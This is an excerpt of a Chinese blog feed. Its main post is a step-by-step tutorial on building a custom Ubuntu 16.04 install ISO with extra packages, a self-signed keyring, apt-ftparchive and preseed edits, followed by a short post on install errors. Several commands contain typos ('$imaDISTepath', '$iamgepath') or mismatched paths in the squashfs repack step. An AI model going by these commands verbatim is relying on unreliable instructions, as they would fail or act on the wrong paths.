    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本教程是在ubuntu16.04 desktop amd64上进行编辑。<br>镜像为ubuntu16.04 server amd64。<br>参考地址：<br><a href="https://help.ubuntu.com/community/InstallCDCustomization?action=show&redirect=InstallCDCustomizationHowTo" target="_blank" rel="noopener">InstallCDCustomization</a><br><a href="https://help.ubuntu.com/community/LiveCDCustomization" target="_blank" rel="noopener">LiveCDCustomization</a><br><a href="https://wiki.ubuntu.com/定制Ubuntu安装CD" target="_blank" rel="noopener">定制Ubuntu安装CD</a></p><p>这里对接下来使用的一些变量进行说明</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$isopath</span>        <span class="comment">#iso文件的路径</span></span><br><span class="line"><span class="variable">$mountpoint</span>     <span class="comment">#将iso挂载的点</span></span><br><span class="line"><span class="variable">$imagepath</span>      <span class="comment">#将iso文件复制到的目录</span></span><br><span class="line"><span class="variable">$keybuild</span>       <span class="comment">#构建ubuntu-keyring包的位置</span></span><br><span class="line"><span class="variable">$yourkeyid</span>      <span class="comment">#你自己生成的key</span></span><br><span class="line"><span class="variable">$indicesDir</span>     <span class="comment">#下载的indice文件</span></span><br><span class="line"><span class="variable">$DIST</span>           <span class="comment">#ubuntu的开发代号,使用第一个单词，比如16.04为xenial</span></span><br><span class="line"><span class="variable">$version</span>        <span class="comment">#ubuntu的版本号</span></span><br><span class="line"><span class="variable">$aptftparchiveconf</span>  <span class="comment">#存放apt-ftparchive配置文件的目录</span></span><br><span class="line"><span class="variable">$APTCONF</span>        <span class="comment">#release.conf的位置</span></span><br></pre></td></tr></table></figure><h2 id="1-拷贝镜像内容到硬盘上"><a href="#1-拷贝镜像内容到硬盘上" class="headerlink" title="1.拷贝镜像内容到硬盘上"></a>1.拷贝镜像内容到硬盘上</h2><p>挂载镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop <span class="variable">$isopath</span> <span class="variable">$mountpoint</span></span><br></pre></td></tr></table></figure><p>使用rsync复制文件到硬盘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av <span class="variable">$mountpoint</span> <span class="variable">$imagepath</span></span><br></pre></td></tr></table></figure><p>或者直接使用cp命令拷贝</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p <span class="variable">$imagepath</span></span><br><span class="line">cp -a <span class="variable">$mountpoint</span> <span class="variable">$imagepath</span></span><br></pre></td></tr></table></figure><ul><li>注意在复制完后查看一下，是否.disk也复制过去了，如果没有，最终镜像安装会出现这不是一张UbuntuCD的警告。</li></ul><h2 id="2-创建extras组件"><a href="#2-创建extras组件" class="headerlink" title="2.创建extras组件"></a>2.创建extras组件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$imagepath</span></span><br><span class="line">mkdir -p pool/extras/</span><br></pre></td></tr></table></figure><p>把你想要安装的.deb包都放到pool/extras/目录下。</p><h2 id="3-生成新的ubuntu-keyring-deb来对你的CD进行签名"><a href="#3-生成新的ubuntu-keyring-deb来对你的CD进行签名" class="headerlink" title="3.生成新的ubuntu-keyring.deb来对你的CD进行签名"></a>3.生成新的ubuntu-keyring.deb来对你的CD进行签名</h2><p>我们需要使用GPG来对release文件进行签名，安装系统会根据所持有的Ubuntu-keyring包来对公钥签名进行验证。<br>为了完成密钥的生成你需要下载gpg包。<br>签名密钥生成的命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpg --gen-key</span><br></pre></td></tr></table></figure><p>一切都按默认的来就行，不过教程上种类使用的是DSA and Elgamal，因此我也采用了这个种类。<br>列出key</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gpg --list-keys</span><br><span class="line">pub   1024D/437D05B5 2006-09-08</span><br><span class="line">uid                  XXX Signing Key &lt;packages@xxx.example.org&gt;</span><br><span class="line">sub   2048g/79164387 2006-09-08</span><br></pre></td></tr></table></figure><p>你也可以在–list-keys 后面加参数来查找相关的key</p><p>生成完密钥后，构建包含自己密钥的ubuntu-keyring包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$keybuild</span></span><br><span class="line">sudo apt-get install fakeroot   </span><br><span class="line">apt-get <span class="built_in">source</span> ubuntu-keyring</span><br><span class="line"><span class="built_in">cd</span> ubuntu-keyring-2012.05.19/keyrings</span><br><span class="line">gpg --import &lt; ubuntu-archive-keyring.gpg</span><br><span class="line">gpg --list-keys <span class="string">"你的key的名字或者邮箱"</span></span><br><span class="line">gpg --<span class="built_in">export</span> FBB75451 437D05B5 C0B21F32 EFE21092 <span class="variable">$yourkeyid</span> &gt; ubuntu-archive-keyring.gpg</span><br><span class="line"><span class="built_in">cd</span> ..    <span class="comment"># 现在处于ubuntu-keyring-2012.05.19目录中</span></span><br><span class="line">dpkg-buildpackage -rfakeroot -m<span class="string">"Your Name &lt;your.email@your.host&gt;"</span> -k<span class="variable">$yourkeyid</span></span><br><span class="line"><span class="built_in">cd</span> ..  <span class="comment"># 现在处于$keybuild中</span></span><br><span class="line">cp ubuntu-keyring*deb <span class="variable">$imagepath</span>/pool/main/u/ubuntu-keyring</span><br></pre></td></tr></table></figure><ul><li>dpkg-buildpackage会去root下面寻找你的key，所以推荐这些过程以root账号运行。</li></ul><h2 id="4-生成新的filesystem-squashfs"><a href="#4-生成新的filesystem-squashfs" class="headerlink" title="4.生成新的filesystem.squashfs"></a>4.生成新的filesystem.squashfs</h2><p>解开filesystem.squashfs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$imagepath</span></span><br><span class="line">unsquashfs install/filesystem.squashfs</span><br></pre></td></tr></table></figure><p>这个时DIST在install目录下会出现squashfs-root目录<br>将你的kDISTy导入到相应的目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$imaDISTepath</span>/install/squashfs-root</span><br><span class="line">gpg --<span class="built_in">export</span> FBB75451 437D05B5 C0B21F32 EFE21092 <span class="variable">$yourkeyid</span> &gt; /usr/share/keyrings/ubuntu-archive-keyring.gpg </span><br><span class="line">gpg --<span class="built_in">export</span> FBB75451 437D05B5 C0B21F32 EFE21092 <span class="variable">$yourkeyid</span> &gt; /etc/apt/trusted.gpg </span><br><span class="line">gpg --<span class="built_in">export</span> FBB75451 437D05B5 C0B21F32 EFE21092 <span class="variable">$yourkeyid</span> &gt; /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg</span><br></pre></td></tr></table></figure><p>squashfs-root应该是相当于没有安装软件和配置的ubuntu系统文件，如果你需要对ubuntu进行一些个性化配置，可以对相应文件修改，比如修改squashfs-root下的/etc/apt/sources.list来更改源之类的操作。<br>配合上chroot也可以进行更加高级的操作</p><p>修改完后将其大小记录到filesystem.size</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$imagepath</span>/install/squashfs-root</span><br><span class="line">du -sx --block-size=1 ./ | cut -f1 &gt; <span class="variable">$imagepath</span>/install/filesystem.size</span><br></pre></td></tr></table></figure><p>重新打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm extract-cd/casper/filesystem.squashfs</span><br><span class="line">mksquashfs edit extract-cd/casper/filesystem.squashfs -nolzma</span><br></pre></td></tr></table></figure><ul><li>-nolzma参数只适用于Hardy到Karmic版本。</li><li>squashfs必须使用与您正在定制的CD上使用的内核兼容的mksquashfs版本生成。例如，您不能在karmic上生成jaunty的squashfs，因为jaunty内核无法挂载使用mksquashfs从karmic准备的squashfs。</li></ul><h2 id="5-使用apt-ftparchive来构建仓库"><a href="#5-使用apt-ftparchive来构建仓库" class="headerlink" title="5.使用apt-ftparchive来构建仓库"></a>5.使用apt-ftparchive来构建仓库</h2><p>获取indices文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p <span class="variable">$indicesDir</span> </span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$indicesDir</span></span><br><span class="line">DIST=<span class="variable">$DIST</span></span><br><span class="line"><span class="keyword">for</span> SUFFIX <span class="keyword">in</span> extra.main main main.debian-installer restricted restricted.debian-installer; <span class="keyword">do</span></span><br><span class="line">  wget http://archive.ubuntu.com/ubuntu/indices/override.<span class="variable">$DIST</span>.<span class="variable">$SUFFIX</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>接下来在创建apt-ftparchive的配置文件<br>分别为apt-ftparchive-deb.conf, apt-ftparchive-udeb.conf, apt-ftparchive-extras.conf,和release.conf，放在$aptftparchiveconf目录下。</p><p>这里给出相关的配置文件<br>apt-ftparchive-deb.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Dir &#123;</span><br><span class="line">  ArchiveDir <span class="string">"<span class="variable">$imagepath</span>"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">TreeDefault &#123;</span><br><span class="line">  Directory <span class="string">"pool/"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BinDirectory <span class="string">"pool/main"</span> &#123;</span><br><span class="line">  Packages <span class="string">"dists/<span class="variable">$DIST</span>/main/binary-amd64/Packages"</span>;</span><br><span class="line">  BinOverride <span class="string">"<span class="variable">$indicesDir</span>/override.<span class="variable">$DIST</span>.main"</span>;</span><br><span class="line">  ExtraOverride <span class="string">"<span class="variable">$indicesDir</span>/override.<span class="variable">$DIST</span>.extra.main"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BinDirectory <span class="string">"pool/restricted"</span> &#123;</span><br><span class="line"> Packages <span class="string">"dists/<span class="variable">$DIST</span>/restricted/binary-amd64/Packages"</span>;</span><br><span class="line"> BinOverride <span class="string">"<span class="variable">$indicesDir</span>/override.<span class="variable">$DIST</span>.restricted"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Default &#123;</span><br><span class="line">  Packages &#123;</span><br><span class="line">    Extensions <span class="string">".deb"</span>;</span><br><span class="line">    Compress <span class="string">". gzip"</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Contents &#123;</span><br><span class="line">  Compress <span class="string">"gzip"</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>apt-ftparchive-udeb.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Dir &#123;</span><br><span class="line">  ArchiveDir <span class="string">"<span class="variable">$imagepath</span>"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">TreeDefault &#123;</span><br><span class="line">  Directory <span class="string">"pool/"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BinDirectory <span class="string">"pool/main"</span> &#123;</span><br><span class="line">  Packages <span class="string">"dists/<span class="variable">$DIST</span>/main/debian-installer/binary-amd64/Packages"</span>;</span><br><span class="line">  BinOverride <span class="string">"<span class="variable">$indicesDir</span>/override.<span class="variable">$DIST</span>.main.debian-installer"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BinDirectory <span class="string">"pool/restricted"</span> &#123;</span><br><span class="line">  Packages <span class="string">"dists/<span class="variable">$DIST</span>/restricted/debian-installer/binary-amd64/Packages"</span>;</span><br><span class="line">  BinOverride <span class="string">"<span class="variable">$indicesDir</span>/override.<span class="variable">$DIST</span>.restricted.debian-installer"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Default &#123;</span><br><span class="line">  Packages &#123;</span><br><span class="line">    Extensions <span class="string">".udeb"</span>;</span><br><span class="line">    Compress <span class="string">". gzip"</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Contents &#123;</span><br><span class="line">  Compress <span class="string">"gzip"</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>apt-ftparchive-extras.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Dir &#123;</span><br><span class="line">  ArchiveDir <span class="string">"<span class="variable">$imagepath</span>"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">TreeDefault &#123;</span><br><span class="line">  Directory <span class="string">"pool/"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BinDirectory <span class="string">"pool/extras"</span> &#123;</span><br><span class="line">  Packages <span class="string">"dists/<span class="variable">$DIST</span>/extras/binary-amd64/Packages"</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Default &#123;</span><br><span class="line">  Packages &#123;</span><br><span class="line">    Extensions <span class="string">".deb"</span>;</span><br><span class="line">    Compress <span class="string">". gzip"</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Contents &#123;</span><br><span class="line">  Compress <span class="string">"gzip"</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>release.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">APT::FTPArchive::Release::Origin <span class="string">"Ubuntu"</span>;</span><br><span class="line">APT::FTPArchive::Release::Label <span class="string">"Ubuntu"</span>;</span><br><span class="line">APT::FTPArchive::Release::Suite <span class="string">"<span class="variable">$DIST</span>"</span>;</span><br><span class="line">APT::FTPArchive::Release::Version <span class="string">"<span class="variable">$version</span>"</span>;</span><br><span class="line">APT::FTPArchive::Release::Codename <span class="string">"<span class="variable">$DIST</span>"</span>;</span><br><span class="line">APT::FTPArchive::Release::Architectures <span class="string">"amd64"</span>;</span><br><span class="line">APT::FTPArchive::Release::Components <span class="string">"main restricted extras"</span>;</span><br><span class="line">APT::FTPArchive::Release::Description <span class="string">"xxxxxx"</span>;</span><br></pre></td></tr></table></figure><p>创建包的引用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$imagepath</span></span><br><span class="line">apt-ftparchive packages pool/extras &gt; dists/stable/extras/binary-amd64/Packages</span><br><span class="line">gzip -c dists/stable/extras/binary-amd64/Packages | tee dists/stable/extras/binary-amd64/Packages.gz &gt; /dev/null</span><br></pre></td></tr></table></figure><p>开始构建仓库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">APTCONF=<span class="variable">$aptftparchiveconf</span>/release.conf</span><br><span class="line">DIST=xenial</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$imagepath</span></span><br><span class="line">apt-ftparchive -c <span class="variable">$APTCONF</span> generate /opt/apt-ftparchive/apt-ftparchive-deb.conf</span><br><span class="line">apt-ftparchive -c <span class="variable">$APTCONF</span> generate /opt/apt-ftparchive/apt-ftparchive-udeb.conf</span><br><span class="line">apt-ftparchive -c <span class="variable">$APTCONF</span> generate /opt/apt-ftparchive/apt-ftparchive-extras.conf</span><br><span class="line">apt-ftparchive -c <span class="variable">$APTCONF</span> release <span class="variable">$imagepath</span>/dists/<span class="variable">$DIST</span> &gt; <span class="variable">$imagepath</span>/dists/<span class="variable">$DIST</span>/Release</span><br></pre></td></tr></table></figure><p>对release文件签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$imagepath</span></span><br><span class="line">gpg --default-key <span class="variable">$yourkeyid</span> --output <span class="variable">$imagepath</span>/dists/<span class="variable">$DIST</span>/Release.gpg -ba <span class="variable">$imagepath</span>/dists/<span class="variable">$DIST</span>/Release</span><br></pre></td></tr></table></figure><h2 id="6-编辑seed文件来安装"><a href="#6-编辑seed文件来安装" class="headerlink" title="6.编辑seed文件来安装"></a>6.编辑seed文件来安装</h2><p>生成的iso似乎不会安装extras里面的软件，这里给出一个修补的办法，修改preseed目录下的seed文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chmod +w  <span class="variable">$iamgepath</span>/preseed/*.seed</span><br><span class="line"><span class="keyword">for</span> seed <span class="keyword">in</span> <span class="variable">$iamgepath</span>/preseed/*.seed; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"d-i preseed/late_command string apt-install <span class="variable">$packagename</span>"</span> &gt;&gt; <span class="variable">$seed</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">chmod -w  <span class="variable">$iamgepath</span>/preseed/*.seed</span><br></pre></td></tr></table></figure><p>*软件名字似乎都是小写若安装不成功，可以在安装界面按下alt+F2进入shell脚本界面，通过以下命令来查询你的软件包的名字。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search package_name</span><br></pre></td></tr></table></figure><h2 id="7-生成iso"><a href="#7-生成iso" class="headerlink" title="7.生成iso"></a>7.生成iso</h2><p>对md5文件进行签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$imagepath</span></span><br><span class="line">find -<span class="built_in">type</span> f -print0 | sudo xargs -0 md5sum | grep -v isolinux/ | grep -v md5sum  |sudo tee md5sum.txt</span><br></pre></td></tr></table></figure><p>-b 和 -c指定的路径都是相对于$imagepath来说的，最终会$imagepath下生成iso。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IMAGE=custom.iso</span><br><span class="line"></span><br><span class="line">mkisofs -r -V <span class="string">"Custom Ubuntu Install CD"</span> \</span><br><span class="line">            -cache-inodes \</span><br><span class="line">            -J -l -b isolinux/isolinux.bin \</span><br><span class="line">            -c isolinux/boot.cat -no-emul-boot \</span><br><span class="line">            -boot-load-size 4 -boot-info-table \</span><br><span class="line">            -o <span class="variable">$IMAGE</span> <span class="variable">$imagepath</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个教程只是我跟着wiki上的教程一步一步做的，有许多步骤应该是没必要的，下一节定制debian的系统，其中会有更简洁的方法。可以先按照debian的方法试试，如果通不过再看看Ubuntu的，选择一些步骤添加上。<br><a href="https://doasromansdo.github.io/post/5092e38f.html#more" target="_blank" rel="noopener">在Debian安装镜像中添加软件包</a></p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="A-镜像安装时如何调试"><a href="#A-镜像安装时如何调试" class="headerlink" title="A.镜像安装时如何调试"></a>A.镜像安装时如何调试</h3><p>alt+F1 可以进入可视化界面，也就是正常的Ubuntu安装界面。<br>alt+F2 进入交互式shell界面，此时在isolinux内，可以通过chroot /target来进入正在安装的Ubuntu系统。<br>alt+F4 查看日志，基本知道是哪个地方安装不成功。</p><h3 id="B-ubuntu版本以及名称对应"><a href="#B-ubuntu版本以及名称对应" class="headerlink" title="B.ubuntu版本以及名称对应"></a>B.ubuntu版本以及名称对应</h3><table><thead><tr><th align="center">版本号</th><th align="center">开发代号</th><th align="center">内核版本</th></tr></thead><tbody><tr><td align="center">4.10</td><td align="center">Warty Warthog</td><td align="center">2.6.8</td></tr><tr><td align="center">5.04</td><td align="center">Hoary Hedgehog</td><td align="center">2.6.10</td></tr><tr><td align="center">5.10</td><td align="center">Breezy Badger</td><td align="center">2.6.12</td></tr><tr><td align="center">6.06LTS</td><td align="center">Dapper Drake</td><td align="center">2.6.15</td></tr><tr><td align="center">6.10</td><td align="center">Edgy Eft</td><td align="center">2.6.17</td></tr><tr><td align="center">7.04</td><td align="center">Feisty Fawn</td><td align="center">2.6.20</td></tr><tr><td align="center">7.10</td><td align="center">Gutsy Gibbon</td><td align="center">2.6.22</td></tr><tr><td align="center">8.04LTS</td><td align="center">Hardy Heron</td><td align="center">2.6.24</td></tr><tr><td align="center">8.10</td><td align="center">Intrepid Ibex</td><td align="center">2.6.27</td></tr><tr><td align="center">9.04</td><td align="center">Jaunty Jackalope</td><td align="center">2.6.28</td></tr><tr><td align="center">9.10</td><td align="center">Karmic Koala</td><td align="center">2.6.31</td></tr><tr><td align="center">10.04LTS</td><td align="center">Lucid Lynx</td><td align="center">2.6.32</td></tr><tr><td align="center">10.10</td><td align="center">Maverick Meerkat</td><td align="center">2.6.35</td></tr><tr><td align="center">11.04</td><td align="center">Natty Narwhal</td><td align="center">2.6.38</td></tr><tr><td align="center">11.10</td><td align="center">Oneiric Ocelot</td><td align="center">3.0</td></tr><tr><td align="center">12.04LTS</td><td align="center">Precise Pangolin</td><td align="center">3.2</td></tr><tr><td align="center">12.10</td><td align="center">Quantal Quetzal</td><td align="center">3.5</td></tr><tr><td align="center">13.04</td><td align="center">Raring Ringtail</td><td align="center">3.8</td></tr><tr><td align="center">13.10</td><td align="center">Saucy Salamander</td><td align="center">3.11</td></tr><tr><td align="center">14.04LTS</td><td align="center">Trusty Tahr</td><td align="center">3.13</td></tr><tr><td align="center">14.10</td><td align="center">Utopic Unicorn</td><td align="center">3.16</td></tr><tr><td align="center">15.04</td><td align="center">Vivid Vervet</td><td align="center">3.19</td></tr><tr><td align="center">15.10</td><td align="center">Wily Werewolf</td><td align="center">4.2</td></tr><tr><td align="center">16.04LTS</td><td align="center">Xenial Xerus</td><td align="center">4.4</td></tr><tr><td align="center">16.10</td><td align="center">Yakkety Yak</td><td align="center">4.8</td></tr><tr><td align="center">17.04</td><td align="center">Zesty Zapus</td><td align="center">4.10</td></tr><tr><td align="center">17.10</td><td align="center">Artful Aardvark</td><td align="center">4.13</td></tr><tr><td align="center">18.04LTS</td><td align="center">Bionic Beaver</td><td align="center">4.15</td></tr><tr><td align="center">18.10</td><td align="center">Cosmic Cuttlefish</td><td align="center">4.18</td></tr><tr><td align="center">19.04</td><td align="center">Disco Dingo</td><td align="center">5.0</td></tr><tr><td align="center">19.10</td><td align="center">Eoan Ermine</td><td align="center">5.3</td></tr><tr><td align="center"><a href="https://zh.wikipedia.org/wiki/Ubuntu发行版列表" target="_blank" rel="noopener">中文维基-Ubuntu发行版列表</a></td><td align="center"></td><td align="center"></td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;本教程是在ubuntu16.04 desktop amd64上进行编辑。&lt;br&gt;镜像为ubuntu16.04 server amd64。&lt;b
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
      <category term="Ubuntu" scheme="http://yoursite.com/tags/Ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04 server 安装中的坑</title>
    <link href="http://yoursite.com/post/7d33fc70.html"/>
    <id>http://yoursite.com/post/7d33fc70.html</id>
    <published>2019-11-11T07:52:31.000Z</published>
    <updated>2019-11-11T07:55:48.922Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-安装busybox-initramfs错误"><a href="#1-安装busybox-initramfs错误" class="headerlink" title="1.安装busybox initramfs错误"></a>1.安装busybox initramfs错误</h2><p>1.如果你是用中文安装的会出现这个错误，需要用英文安装<br>2.在语言界面按下F6进选项，可以在下面看到一串参数行，把里面的quiet修改为all_generic_ide回车就可正常安装</p><h2 id="2-安装grub-pc失败"><a href="#2-安装grub-pc失败" class="headerlink" title="2.安装grub-pc失败"></a>2.安装grub-pc失败</h2><p>可以按快捷键Alt+F4查看日志，如果是连接失败，说明源有问题，返回打开shell将/tartget/apt/sources.list中添加国内xenial源(根据你安装的版本来)，这里给出一个我找到的,应该能用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>你可以执行以下指令测试或者直接安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chroot /target</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install grub-pc</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-安装busybox-initramfs错误&quot;&gt;&lt;a href=&quot;#1-安装busybox-initramfs错误&quot; class=&quot;headerlink&quot; title=&quot;1.安装busybox initramfs错误&quot;&gt;&lt;/a&gt;1.安装busybox initr
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
      <category term="Ubuntu" scheme="http://yoursite.com/tags/Ubuntu/"/>
    
      <category term="随手记录" scheme="http://yoursite.com/tags/%E9%9A%8F%E6%89%8B%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>deb包的制作</title>
    <link href="http://yoursite.com/post/b1d021eb.html"/>
    <id>http://yoursite.com/post/b1d021eb.html</id>
    <published>2019-11-05T08:36:26.000Z</published>
    <updated>2019-11-12T07:48:31.316Z</updated>
    
